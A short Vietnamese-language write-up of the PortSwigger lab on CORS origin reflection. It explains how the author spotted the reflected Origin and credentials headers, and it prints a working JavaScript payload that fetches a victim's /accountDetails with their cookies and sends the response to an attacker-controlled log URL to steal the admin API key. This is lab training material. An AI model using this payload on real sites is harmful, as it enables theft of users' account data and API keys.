![[cors-basic.png]]
-mô tả lab: endpoint `/accountDetails` reflect đúng `Origin` mình gửi + cho credentials. Mình đọc API key của administrator.

> [!NOTE]
> -link lab: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

### hướng giải
- [ ] mình GET `/accountDetails` kèm `Origin: https://evil.com`, sau đó quan sát gói tin trả về, mình thấy `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
- [ ] => nên mình chốt là server reflect bừa, mình chỉ cần dụ admin vào trang exploit, JS sẽ gửi request kèm cookie admin rồi forward response về cho mình

### giải
-bước 1: mình tạo file exploit trên exploit-server:
```html
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('GET', 'https://LAB-ID.web-security-academy.net/accountDetails', true);
req.withCredentials = true;
req.send();
function reqListener() {
  location = 'https://exploit-LAB.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
}
</script>
</body>
</html>
```
![[cors-basic-exploit.png]]

-bước 2: mình bấm `Deliver exploit to victim`, rồi vào `View exploit` -> `Access log`, sau đó quan sát log này, mình thấy response chứa `apikey: SECRET...` của administrator.
-> mình submit API key vào là solve.

> [!NOTE]
> -bài học của mình: reflect Origin + Credentials true là combo chết người. Thấy 2 header này đi chung là khai thác ngay.
